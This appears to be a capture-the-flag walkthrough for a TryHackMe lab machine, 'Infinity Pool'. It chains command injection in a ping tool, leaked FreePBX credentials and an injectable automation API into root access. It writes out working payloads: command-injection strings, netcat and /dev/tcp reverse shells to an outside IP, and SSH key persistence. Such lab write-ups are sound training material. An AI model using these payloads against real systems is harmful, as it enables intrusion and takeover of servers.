---

Name: Infinity Pool  
Difficulty: Medium  
URL: https://tryhackme.com/room/hh-infinitypool-5b3548af  
Description: No visible edge. You trace the network to the horizon and find three systems nobody told you about on the other side.

---

## Initial Enumeration

Inside the page source we find that `/static/app.js` is used.

```bash
$ curl http://pool.thm/static/app.js

// Byte Lotus front-end bootstrap.
// TODO(ops): the staff connectivity tool at /status posts to the legacy
// /internal/netcheck handler. Keep it out of the public nav until the new
// auth gateway ships. Disallowed in robots.txt for now.
console.log("Stay Noticed™");
````

Checking `robots.txt` reveals two interesting endpoints.

```txt
User-agent: *
Disallow: /internal/
Disallow: /status
```

Browsing to `/status` shows a page that lets us ping remote hosts.

## Command Injection

Testing with `127.0.0.1` works as expected.

```text
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.038 ms
```

Trying to chain another command confirms command injection.

```text
127.0.0.1; id
```

```text
uid=1001(web) gid=1001(web) groups=1001(web)
```

We locate the user flag.

```text
127.0.0.1; find / -name user.txt 2>/dev/null
```

```text
/home/web/user.txt
```

And read it.

```text
127.0.0.1; cat /home/web/user.txt
```

## Initial Foothold

Start a listener.

```bash
nc -lvnp 4444
```

Generate a reverse shell using https://www.revshells.com/.

```text
127.0.0.1; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.138.209 4444 >/tmp/f
```

For convenience, generate an SSH key.

```bash
ssh-keygen -t ed25519 -f thm_web_key -N ""
```

Append the public key to `authorized_keys`.

```bash
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHA+TAHvMipNsw3U6JCmk7+agO+HDbkQ8/LqEb9Bl+V+ theo@test' >> ~/.ssh/authorized_keys

chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
```

Now we can connect over SSH.

```bash
ssh -i thm_web_key web@pool.thm
```

## Internal Enumeration

Checking listening ports reveals several localhost-only services.

```bash
ss -tuln
```

Forward them over SSH.

```bash
ssh -i thm_web_key \
    -L 3000:127.0.0.1:3000 \
    -L 8080:127.0.0.1:8080 \
    -L 8088:127.0.0.1:8088 \
    -L 8089:127.0.0.1:8089 \
    -L 9000:127.0.0.1:9000 \
    web@pool.thm
```

The Watchtower service exposes a configuration endpoint.

```bash
curl http://127.0.0.1:3000/api/config
```

```json
{
  "automation_endpoint":"http://127.0.0.1:9000",
  "ops_note":"UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
  "telephony_user":"FreePBXUCPTemplateCreator",
  "telephony_pass":"St4yN0t1c3d_2026",
  "telephony_portal":"http://127.0.0.1:8080/ucp"
}
```

The configuration leaks valid FreePBX UCP credentials.

## FreePBX

Login to the UCP portal using the leaked credentials.

After creating a dashboard and enabling all available widgets, the Voicemail widget reveals an Automation API key.

```text
Automation Key: cc_auto_7b3f9a1c4e0d2f6a
```

## Root Command Injection

The automation service exposes an authenticated endpoint.

```bash
curl \
  -X POST http://127.0.0.1:9000/jobs/export \
  -H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a" \
  -H "Content-Type: application/json" \
  -d '{"report":"test"}'
```

```json
{
  "command":"tar czf /var/automation/exports/test.tgz /var/automation/data 2>&1"
}
```

The `report` parameter is directly inserted into a shell command.

Using command substitution proves the command executes as root.

```bash
curl -s \
  -X POST http://127.0.0.1:9000/jobs/export \
  -H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a" \
  -H "Content-Type: application/json" \
  -d '{"report":"test$(id)"}'
```

The response contains:

```text
gid=0(root)
groups=0(root)
```

Finally, inject a reverse shell.

```bash
curl -s \
  -X POST http://127.0.0.1:9000/jobs/export \
  -H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a" \
  -H "Content-Type: application/json" \
  -d '{"report":"test$(bash -c \"bash -i >& /dev/tcp/192.168.138.209/4444 0>&1\")"}'
```

Catch the connection and verify that we are root.

```bash
root@tryhackme-2404:~# id

uid=0(root) gid=0(root) groups=0(root)
```

